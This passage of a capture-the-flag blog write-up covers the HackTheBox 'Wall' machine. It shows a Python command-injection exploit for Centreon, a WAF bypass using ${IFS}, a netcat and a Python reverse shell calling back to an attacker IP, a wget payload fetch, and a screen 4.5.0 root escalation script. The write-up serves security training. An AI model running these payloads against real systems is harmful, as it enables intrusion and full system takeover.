    <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">centreon_token</span><span style="color:#e6db74">&#34;</span>: token
}
login_request <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>post(url<span style="color:#f92672">+</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/index.php</span><span style="color:#e6db74">&#34;</span>, login_info)
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">[+] Login token is : {0}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(token))
<span style="color:#66d9ef">if</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Your credentials are incorrect.</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> login_request<span style="color:#f92672">.</span>text:
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">[+] Logged In</span><span style="color:#e6db74">&#34;</span>)
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">[+] Retrieving Poller token</span><span style="color:#e6db74">&#34;</span>)

    poller_configuration_page <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/main.get.php?p=60901</span><span style="color:#e6db74">&#34;</span>
    get_poller_token <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>get(poller_configuration_page)
    poller_html <span style="color:#f92672">=</span> get_poller_token<span style="color:#f92672">.</span>text
    poller_soup <span style="color:#f92672">=</span> BeautifulSoup(poller_html, features<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">html.parser</span><span style="color:#e6db74">&#34;</span>)
    poller_token <span style="color:#f92672">=</span> poller_soup<span style="color:#f92672">.</span>findAll(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">input</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#ae81ff">25</span>]<span style="color:#f92672">.</span>get(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">value</span><span style="color:#e6db74">&#34;</span>)
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">[+] Poller token is : {0}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(poller_token))

    payload_info <span style="color:#f92672">=</span> {
        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">name</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Central66</span><span style="color:#e6db74">&#34;</span>,
        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ns_ip_address</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">127.0.0.1</span><span style="color:#e6db74">&#34;</span>,
        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">localhost[localhost]</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">1</span><span style="color:#e6db74">&#34;</span>,
        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">is_default[is_default]</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">0</span><span style="color:#e6db74">&#34;</span>,
        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">remote_id</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>,
        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ssh_port</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">22</span><span style="color:#e6db74">&#34;</span>,
        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">init_script</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">centengine</span><span style="color:#e6db74">&#34;</span>,
        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">nagios_bin</span><span style="color:#e6db74">&#34;</span>: command,
        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">nagiostats_bin</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/usr/sbin/centenginestats</span><span style="color:#e6db74">&#34;</span>,
        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">nagios_perfdata</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/var/log/centreon-engine/service-perfdata</span><span style="color:#e6db74">&#34;</span>,
        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">centreonbroker_cfg_path</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/etc/centreon-broker</span><span style="color:#e6db74">&#34;</span>,
        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">centreonbroker_module_path</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/usr/share/centreon/lib/centreon-broker</span><span style="color:#e6db74">&#34;</span>,
        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">centreonbroker_logs_path</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>,
        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">centreonconnector_path</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/usr/lib64/centreon-connector</span><span style="color:#e6db74">&#34;</span>,
        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">init_script_centreontrapd</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">centreontrapd</span><span style="color:#e6db74">&#34;</span>,
        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">snmp_trapd_path_conf</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/etc/snmp/centreon_traps/</span><span style="color:#e6db74">&#34;</span>,
        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ns_activate[ns_activate]</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">1</span><span style="color:#e6db74">&#34;</span>,
        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">submitC</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Save</span><span style="color:#e6db74">&#34;</span>,
        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">id</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">1</span><span style="color:#e6db74">&#34;</span>,
        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">o</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">c</span><span style="color:#e6db74">&#34;</span>,
        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">centreon_token</span><span style="color:#e6db74">&#34;</span>: poller_token,
    }

    send_payload <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>post(poller_configuration_page, payload_info)
    <span style="color:#66d9ef">print</span>(send_payload<span style="color:#f92672">.</span>text)
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">[+] Injecting Done.</span><span style="color:#e6db74">&#34;</span>)
    generate_xml_page <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/include/configuration/configGenerate/xml/generateFiles.php</span><span style="color:#e6db74">&#34;</span>
    xml_page_data <span style="color:#f92672">=</span> {
        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">poller</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">1</span><span style="color:#e6db74">&#34;</span>,
        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">debug</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">true</span><span style="color:#e6db74">&#34;</span>,
        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">generate</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">true</span><span style="color:#e6db74">&#34;</span>,
    }
    r <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>post(generate_xml_page, xml_page_data)


<span style="color:#66d9ef">else</span>:
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">[-] Wrong credentials</span><span style="color:#e6db74">&#34;</span>)
    exit()
</code></pre></div><p>The exploit takes one argument which is the command we want to run. Let&rsquo;s try to run a <code>netcat</code> reverse shell:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python exploit.py <span style="color:#e6db74">&#34;nc -e /bin/sh 10.0.0.1 8585&#34;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Retrieving CSRF token to submit the login form
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Login token is : b4710792d09b371b03c9ef6d3bbf3f26
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Logged In
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Retrieving Poller token
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Poller token is : c7f63cd8143107496edfdb8ac304b5ca
&lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//IETF//DTD HTML 2.0//EN&#34;</span>&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;403 Forbidden&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Forbidden&lt;/h1&gt;
&lt;p&gt;You don<span style="color:#960050;background-color:#1e0010">&#39;</span>t have permission to access /centreon/main.get.php
on this server.&lt;br /&gt;
&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span> Server at wall.htb Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Injecting Done.
</code></pre></div><p>Hum, we get stuck with <code>Forbidden</code>.</p>
<p>Seems like a WAF (web application firewall) is in place (probably the why the box name is <code>Wall</code>). When we send a simple test command, like <code>test</code> the injection succeed. Let&rsquo;s try to send a few special char we had in our netcat command to find which one exactly is filtered :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python exploit.py <span style="color:#e6db74">&#34;-/,.&#34;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Retrieving CSRF token to submit the login form
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Login token is : b4710792d09b371b03c9ef6d3bbf3f26
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Logged In
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Retrieving Poller token
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Poller token is : c7f63cd8143107496edfdb8ac304b5ca
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Injecting Done.
</code></pre></div><p>No blocking this time&hellip; So what remains ? The space of course&hellip;. Let&rsquo;s give it a try:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python exploit.py <span style="color:#e6db74">&#34;test test&#34;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Retrieving CSRF token to submit the login form
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Login token is : b4710792d09b371b03c9ef6d3bbf3f26
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Logged In
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Retrieving Poller token
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Poller token is : c7f63cd8143107496edfdb8ac304b5ca
&lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//IETF//DTD HTML 2.0//EN&#34;</span>&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;403 Forbidden&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Forbidden&lt;/h1&gt;
&lt;p&gt;You don<span style="color:#960050;background-color:#1e0010">&#39;</span>t have permission to access /centreon/main.get.php
on this server.&lt;br /&gt;
&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span> Server at wall.htb Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Injecting Done.
</code></pre></div><p>So now we have to find a solution to use command without spaces&hellip; Searching a bit online we find that it&rsquo;s possible to use the <a href="https://en.wikipedia.org/wiki/Internal_field_separator">Internal field separator</a> :</p>
<blockquote>
<p>The shell treats each character of $IFS as a delimiter, and splits the results of the other expansions into words on these characters.</p>
</blockquote>
<p>Let&rsquo;s give it try:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo$IFStest
$
</code></pre></div><p>Unfortunately this doesn&rsquo;t seems to work but using the brackets works!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo<span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span>test
test
</code></pre></div><p>Let&rsquo;s try edit our exploit to replace spaces with the IFS:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">[...]
command = sys.argv[1]
<span style="color:#a6e22e">+ command = command.replace(&#39; &#39;, &#39;${IFS}&#39;)
</span><span style="color:#a6e22e"></span>[...]
</code></pre></div><p>This time we are going to open a local web server to have feedback on wether our command injection worked on not. In a new terminal let&rsquo;s open a python simple http server:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python -m http.server
Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
</code></pre></div><p>And let&rsquo;s run our exploit again:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python exploit.py <span style="color:#e6db74">&#34;wget 10.10.10.10:8000/hg8.py -O /tmp/hg8.py&#34;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Retrieving CSRF token to submit the login form
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Login token is : 56855cc04ceb87148ce7d83c4b90bd9e
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Logged In
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Retrieving Poller token
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Poller token is : 7b642628745280f86fc6100f43fd7ad9
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Injecting Done.
</code></pre></div><p>And on our web server we see a new entry:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python -m http.server
Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
10.10.10.10 - - <span style="color:#f92672">[</span>29/Oct/2019 13:29:27<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /hg8.py HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
</code></pre></div><p>The <code>hg8.py</code> countains a python reverse shell:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span>subprocess<span style="color:#f92672">,</span>os;s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM);s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">10.0.0.1</span><span style="color:#e6db74">&#34;</span>,<span style="color:#ae81ff">8585</span>));os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">0</span>); os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">1</span>); os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>);p<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>call([<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">-i</span><span style="color:#e6db74">&#34;</span>]);
</code></pre></div><p>Since we managed to write it to the server, let&rsquo;s run it now. We first open our <code>nc</code> listener:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
Listening on any address <span style="color:#ae81ff">8585</span>
</code></pre></div><p>And run the exploit again :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python exploit.py <span style="color:#e6db74">&#34;python /tmp/hg8.py&#34;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Retrieving CSRF token to submit the login form
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Login token is : b4710792d09b371b03c9ef6d3bbf3f26
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Logged In
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Retrieving Poller token
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Poller token is : c7f63cd8143107496edfdb8ac304b5ca
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Injecting Done.
</code></pre></div><p>And the shell open in our reverse shell:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
Listening on any address <span style="color:#ae81ff">8585</span>
Connection from 10.10.10.157:50472
/bin/sh: 0: can<span style="color:#960050;background-color:#1e0010">&#39;</span>t access tty; job control turned off
$ id
uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>,6000<span style="color:#f92672">(</span>centreon<span style="color:#f92672">)</span>
</code></pre></div><p>We got our first shell. Time to move onto the user flag.</p>
<p>Let&rsquo;s enumerate what we have here :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ls -l /home
total <span style="color:#ae81ff">8</span>
drwxr-xr-x <span style="color:#ae81ff">6</span> shelby     shelby     <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">30</span> 17:37 shelby
drwxr-xr-x <span style="color:#ae81ff">5</span> sysmonitor sysmonitor <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 15:07 sysmonitor
$ find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
/bin/screen-4.5.0
<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</code></pre></div><p>Interresting, I always run a search for binaries with setuid bit enabled first and this returned <code>screen</code> in version 4.5.0.</p>
<p>As a reminder :</p>
<blockquote>
<p>Binaries with the setuid bit enabled, are being executed as if they were running under the context of the root user. This enables normal (non-privileged) users to use special privileges, like opening sockets. While this seems unnecessary for a normal user, it is actually needed for simple commands like ping.</p>
</blockquote>
<p>After a bit of search we stumbled upon a <a href="https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html">bug</a> that allows to privilege escalte to root with <code>screen</code> 4.5.0 and setuid bit set.
Let&rsquo;s give it a try !</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ <span style="color:#75715e"># On attacker side</span>
$ wget https://raw.githubusercontent.com/XiphosResearch/exploits/master/screen2root/screenroot.sh
2019-10-29 14:59:15 <span style="color:#f92672">(</span>4.83 MB/s<span style="color:#f92672">)</span> - ‘screenroot.sh’ saved <span style="color:#f92672">[</span>1152/1152<span style="color:#f92672">]</span>
$ python -m http.server
Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...

www-data@Wall:/tmp$ wget 10.0.0.1:8000/screenroot.sh
2019-10-29 14:59:58 <span style="color:#f92672">(</span>8.32 MB/s<span style="color:#f92672">)</span> - ‘screenroot.sh’ saved <span style="color:#f92672">[</span>1152/1152<span style="color:#f92672">]</span>
www-data@Wall:/tmp$ bash screenroot.sh
~ gnu/screenroot ~
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> First, we create our shell and library...
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Now we create our /etc/ld.so.preload file...
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Triggering...
<span style="color:#960050;background-color:#1e0010">&#39;</span> from /etc/ld.so.preload cannot be preloaded <span style="color:#f92672">(</span>cannot open shared object file<span style="color:#f92672">)</span>: ignored.
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#66d9ef">done</span>!
No Sockets found in /tmp/screens/S-www-data.

<span style="color:#75715e"># id</span>
uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>,33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>,6000<span style="color:#f92672">(</span>centreon<span style="color:#f92672">)</span>
</code></pre></div><p>We got our root shell !</p>
<p>We skipped the pivot to user part (if there was any) but we can now access easily to both flags:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># cat /home/shelby/user.txt</span>
fe6194544f45xxxxx5b12f8da8406
<span style="color:#75715e"># cat /root/root.txt</span>
1fdbcf8c33exxxxxx2e1b4d5db7
</code></pre></div><p>Later I will give this box another try to pivot correctly to the <code>shelby</code> user if it&rsquo;s possible and update this writeup.</p>
<p>EDIT: Here how the pivot was possible : <a href="https://0xdf.gitlab.io/2019/12/07/htb-wall.html#priv-www-data--shelby">https://0xdf.gitlab.io/2019/12/07/htb-wall.html#priv-www-data--shelby</a></p>
<p>As always do not hesitate to contact me for any questions or feedbacks.</p>
<p>See you next time !</p>
<p>-hg8</p>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h">Read other posts</span>
            <hr />
          </div>
          <div class="pagination__buttons">
            
              <span class="button previous">
                <a href="/posts/craft/">
                  <span class="button__icon">←</span>
                  <span class="button__text">Craft - HackTheBox</span>
                </a>
              </span>
            
            
              <span class="button next">
                <a href="/posts/networked/">
                  <span class="button__text">Networked - HackTheBox</span>
                  <span class="button__icon">→</span>
                </a>
              </span>
            
          </div>
        </div>
      
    


    
      
        

      
    

    </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <div class="footer__content">
        <span>© 2020</span>
        <span><a href="https://hg8.rocks" target="_blank" rel="noopener">hg8</a></span>
<span>
<a href="https://hg8.rocks/index.xml" title="rss">
<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg>
</a>
</span>
<span><a href="https://github.com/hg8" target="_blank" rel="noopener" title="Github">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg>
            </a></span>

      </div>
    
  </div>
</footer>



<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>

      
    </div>

    
  </body>
</html>
